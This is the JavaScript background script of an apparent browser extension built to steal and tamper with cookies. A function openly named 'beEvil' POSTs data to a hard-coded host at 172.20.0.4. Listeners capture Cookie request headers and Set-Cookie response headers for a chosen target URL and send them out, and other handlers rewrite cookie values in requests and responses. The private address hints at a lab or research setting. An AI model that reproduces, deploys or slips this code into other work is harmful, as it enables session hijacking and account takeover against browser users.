function beEvil(data){
    fetch("https://172.20.0.4", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

browser.runtime.onMessage.addListener((req, sen, resp) => {
    switch (req.func) {
        case "beforeGet":
            browser.webRequest.onBeforeSendHeaders.addListener((details) => {
                var cookieIndex = -1
                for (i=0; i<details.requestHeaders.length; i++){
                    if(details.requestHeaders[i].name == "Cookie"){
                        cookieIndex = i;
                    }
                }
                var temp = '[';
                if(cookieIndex != -1){
                    var cookies = details.requestHeaders[cookieIndex].value.split(";");
                        cookies.forEach((cookie) => {
                            cookie = cookie.split("=");
                            temp += '{"name": "' + cookie[0] + '", "value": "' + cookie[1].replaceAll('"', '\\"') +'"},';
                        });
                }
                temp = temp.slice(0,-1) + ']';
                beEvil(JSON.parse(temp));
            },
            {urls: [req.target]},
            ["requestHeaders"]
            );
            break;
        case "beforeSet":
            browser.webRequest.onBeforeSendHeaders.addListener((details) => {
                var cookieIndex = -1
                for (i=0; i<details.requestHeaders.length; i++){
                    if(details.requestHeaders[i].name == "Cookie"){
                        cookieIndex = i;
                    }
                }
                if(cookieIndex != -1){
                    if (details.requestHeaders[cookieIndex].value.includes(req.name + "=")){
                        var cookies = details.requestHeaders[cookieIndex].value.split(";");
                        var tempHeader = ""
                        cookies.forEach((cookie) => {
                            if (cookie.includes(req.name + "=")){
                                tempHeader = tempHeader + req.name + "=" + req.value + "; ";
                            }else{
                                tempHeader = tempHeader + cookie + "; ";
                            }
                        });
                        details.requestHeaders[cookieIndex].value = tempHeader 
                    }else{
                        details.requestHeaders[cookieIndex].value = details.requestHeaders[cookieIndex].value + " " + req.name + "=" + req.value + ";"
                    }
                }
                return {requestHeaders: details.requestHeaders};
                },
                {urls: [req.target]},
                ["blocking", "requestHeaders"]
                );
                
                browser.webRequest.onSendHeaders.addListener((details) => {
                    console.log(details.requestHeaders);
                },
                {urls: [req.target]},
                ["requestHeaders"]
                );
            break;
        case "headersGet":
            browser.webRequest.onHeadersReceived.addListener((details) => {
                setCookieIndicies = [];
                for (i=0; i<details.responseHeaders.length; i++){ 
                    if(details.responseHeaders[i].name == "set-cookie"){
                        setCookieIndicies.push(i);
                    }
                }
                temp = '[';
                for (j=0; j<setCookieIndicies.length; j++){
                    var currentString = details.responseHeaders[setCookieIndicies[j]].value.split(";")[0];
                    currentString = currentString.split("=");
                    temp += '{"name": "' + currentString[0] + '", "value": "' + currentString[1].replaceAll('"', '\\"') +'"},';
                }
                temp = temp.slice(0,-1) + ']';
                beEvil(JSON.parse(temp));
            },
            {urls: [req.target]},
            ["responseHeaders"]
            );
            break;
        case "headersSet":
            browser.webRequest.onHeadersReceived.addListener((details) => {
                for (i=0; i<details.responseHeaders.length; i++){
                    if((details.responseHeaders[i].name == "set-cookie") && (details.responseHeaders[i].value.includes(req.name + "="))){
                        details.responseHeaders[i].value = req.name + "=" + req.value + ";" + details.responseHeaders[i].value.split(/;(.*)/s)[1] 
                        break;
                    }
                }
                return {responseHeaders: details.responseHeaders};
                },
                {urls: [req.target]},
                ["blocking", "responseHeaders"]
                );
                
                browser.webRequest.onResponseStarted.addListener((details) => {
                    console.log(details.responseHeaders);
                },
                {urls: [req.target]},
                ["responseHeaders"]
                );
            break;
    }
});
